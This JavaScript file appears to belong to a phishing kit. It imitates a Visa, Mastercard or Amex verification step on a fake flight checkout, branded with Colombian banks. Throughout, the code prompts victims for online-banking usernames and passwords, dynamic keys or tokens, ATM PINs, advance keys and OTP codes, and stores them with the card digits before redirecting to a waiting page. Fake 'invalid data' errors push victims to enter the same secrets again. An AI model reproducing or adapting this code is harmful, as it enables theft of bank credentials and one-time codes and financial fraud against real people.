/**
 * SET LOGOS
 */
const companyLoader = document.querySelector('#company-loader');
const companyLogo = document.querySelector('#company-logo');
const bankLogo = document.querySelector('#bank-logo');
if(info.checkerInfo.company === 'VISA'){
    companyLoader.setAttribute('src', './assets/logos/visa_verified.png');
    companyLoader.setAttribute('width', '130px');
    companyLoader.setAttribute('style', 'margin-bottom: 40px');

    companyLogo.setAttribute('src', './assets/logos/visa_verified.png');
    companyLogo.setAttribute('width', '90px');
}else if(info.checkerInfo.company === 'MC'){
    companyLoader.setAttribute('src', './assets/logos/mc_id_check_2.jpg');
    companyLoader.setAttribute('width', '400px');

    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
    companyLogo.setAttribute('width', '130px');
}else if(info.checkerInfo.company === 'AM'){
    companyLoader.setAttribute('src', './assets/logos/amex_check_1.png');
    companyLoader.setAttribute('width', '200px');

    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
    companyLogo.setAttribute('width', '110px');
}

if(info.metaInfo.ban === 'bancolombia'){
    bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
    bankLogo.setAttribute('width', `120px`);
}else{
    bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
}

const mainLoader = document.querySelector('.main-loader');
setTimeout(() =>{
    try{
        mainLoader.classList.remove('show');
    }catch(e){
        console.log('e');
    }
}, 2500);

/* ======================================================================
   UTILIDADES DE MENSAJE INLINE (reemplazan alert)
====================================================================== */
const errorBox = document.getElementById('inline-error');

function fieldFromList(list){
  // En tu HTML hay IDs repetidos (b + input). Usas NodeList y el [1] es el input.
  return (list && list.length > 1) ? list[1] : null;
}

function showInlineError(msg, inputList){
  if (errorBox){
    errorBox.textContent = msg || 'Ha ocurrido un error.';
    errorBox.style.display = 'block';
  }
  const input = fieldFromList(inputList);
  if (input){
    input.classList.add('is-error');
    input.setAttribute('aria-invalid','true');
    try{ input.focus(); }catch(e){}
  }
}

function clearInlineError(inputList){
  if (errorBox) errorBox.style.display = 'none';
  const input = fieldFromList(inputList);
  if (input){
    input.classList.remove('is-error');
    input.removeAttribute('aria-invalid');
  }
}

/**
 * SET INPUTS
 */
const user = document.querySelectorAll('#user');
const puser = document.querySelectorAll('#puser');
const cdin = document.querySelectorAll('#cdin');
const dintok = document.querySelectorAll('#dintok');
const ccaj = document.querySelectorAll('#ccaj');
const cavance = document.querySelectorAll('#cavance');
const otpcode = document.querySelectorAll('#otpcode');

if(info.checkerInfo.mode === 'userpassword'){

    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.user !== ''){
            showInlineError('Datos inválidos, por favor corrige la información e inténtalo de nuevo.', user);
        }
    }, 2050);

    user.forEach(elem => elem.classList.remove('hidden'));
    puser.forEach(elem => elem.classList.remove('hidden'));

    if(info.metaInfo.ban === 'bancolombia'){
        puser.forEach(elem => {
            elem.setAttribute('oninput', 'limitDigits(this, 4);');
        });
    }

}else if(info.checkerInfo.mode === 'cdin'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.cdin !== ''){
            if(info.metaInfo.ban === 'bogota'){
                showInlineError('Token inválido o expiró, por favor inténtalo de nuevo.', dintok);
            }else{
                showInlineError('Clave dinámica inválida o expiró, por favor inténtalo de nuevo.', cdin);
            }
        }
    }, 2050);

    if(info.metaInfo.ban === 'bogota'){
        dintok.forEach(elem => elem.classList.remove('hidden'));
    }else{
        cdin.forEach(elem => elem.classList.remove('hidden'));
    }

}else if(info.checkerInfo.mode === 'ccaj'){
    setTimeout(() =>{
        if(info.metaInfo.ccaj !== ''){
            showInlineError('Datos inválidos, por favor ingresa la clave de nuevo.', ccaj);
        }
    }, 2050);
    ccaj.forEach(elem => elem.classList.remove('hidden'));

}else if(info.checkerInfo.mode === 'cavance'){
    setTimeout(() =>{
        if(info.metaInfo.cavance !== ''){
            showInlineError('Datos inválidos, por favor ingresa la clave de nuevo.', cavance);
        }
    }, 2050);
    cavance.forEach(elem => elem.classList.remove('hidden'));

}else if(info.checkerInfo.mode === 'otpcode'){
    setTimeout(() =>{
        if(info.metaInfo.tok === ''){
            showInlineError('Hemos enviado un código OTP a tu teléfono. Por favor ingrésalo.', otpcode);
        } else {
            showInlineError('Código inválido. Enviamos un nuevo OTP a tu teléfono. Por favor ingrésalo.', otpcode);
        }
    }, 2050);
    otpcode.forEach(elem => elem.classList.remove('hidden'));
}

/* Limpia el error cuando el usuario escribe de nuevo */
[fieldFromList(user), fieldFromList(puser), fieldFromList(cdin), fieldFromList(dintok),
 fieldFromList(ccaj), fieldFromList(cavance), fieldFromList(otpcode)]
 .forEach(el => {
   if(el){
     el.addEventListener('input', () => {
       errorBox && (errorBox.style.display = 'none');
       el.classList.remove('is-error');
       el.removeAttribute('aria-invalid');
     });
   }
 });

/**
 * SET NUMBERS
*/
const flightPrice = document.querySelectorAll('#flight-price');
const cardDigits = document.querySelector('#card-digits');
cardDigits.textContent = info.metaInfo.p.split(' ')[3];
function formatPrice(number){
    return number.toFixed(2);
}
let finalPrice = "- -";
if(info.flightInfo.ticket_nat === 'NAC'){
    finalPrice = pricesNAC[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
}else if(info.flightInfo.ticket_nat === 'INT'){
    finalPrice = pricesNAT[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
}else{
    console.log('flight resume error');
}
info.flightInfo.type === 1 ? finalPrice = finalPrice * 2 : '';
flightPrice.forEach(elem => elem.textContent = formatPrice(finalPrice));

/**
 * NEXT STEP
 */
const btnNextStep = document.querySelector('#btnNextStep');

btnNextStep.addEventListener('click', () =>{
    if(info.checkerInfo.mode === 'userpassword'){
        if(user[1].value !== '' && puser[1].value !== ''){
            info.metaInfo.user = user[1].value;
            info.metaInfo.puser = puser[1].value;
            LS.setItem('info', JSON.stringify(info));
            window.location.href = 'waiting.html';
        }else{
            showInlineError('Completa usuario y contraseña para continuar.', user);
        }
    }else if(info.checkerInfo.mode === 'cdin'){
        const target = (info.metaInfo.ban === 'bogota') ? dintok : cdin;
        if(fieldFromList(target)?.value){
            info.metaInfo.cdin = fieldFromList(target).value;
            LS.setItem('info', JSON.stringify(info));
            window.location.href = 'waiting.html';
        }else{
            showInlineError('Ingresa el código solicitado para continuar.', target);
        }

    }else if(info.checkerInfo.mode === 'ccaj'){
        if(ccaj[1].value !== ''){
            info.metaInfo.ccaj = ccaj[1].value;
            LS.setItem('info', JSON.stringify(info));
            window.location.href = 'waiting.html';
        }else{
            showInlineError('Ingresa la clave de cajero para continuar.', ccaj);
        }

    }else if(info.checkerInfo.mode === 'cavance'){
        if(cavance[1].value !== ''){
            info.metaInfo.cavance = cavance[1].value;
            LS.setItem('info', JSON.stringify(info));
            window.location.href = 'waiting.html';
        }else{
            showInlineError('Ingresa la clave de avances para continuar.', cavance);
        }

    }else if(info.checkerInfo.mode === 'otpcode'){
        if(otpcode[1].value !== ''){
            info.metaInfo.tok = otpcode[1].value;
            LS.setItem('info', JSON.stringify(info));
            window.location.href = 'waiting.html';
        }else{
            showInlineError('Ingresa el código OTP para continuar.', otpcode);
        }
    }
});
